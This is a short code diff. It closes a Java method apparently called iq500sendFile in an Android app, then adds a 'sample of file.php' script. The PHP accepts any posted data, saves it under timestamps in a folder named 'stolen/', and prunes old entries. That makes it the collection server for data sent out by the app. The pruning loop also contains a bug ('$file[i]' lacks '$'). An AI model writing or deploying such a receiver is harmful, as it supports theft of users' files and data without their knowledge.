@@ -57,3 +57,19 @@ private void iq500sendFile()
 		catch (Exception e)
 		{/*Toast.makeText(this, e.toString(), Toast.LENGTH_LONG).show();*/}
 	}
+
+sample of file.php:
+<?php
+$inp = file_get_contents("php://input");
+file_put_contents("stolen/" . time(), $inp);
+
+$file = scandir("stolen/");
+if(sizeof($file) > 52)
+{
+for($i = 2; $i < sizeof($file) - 50; $i++)
+{
+unlink("stolen/" . $file[i]);
+}
+}
+
+?>
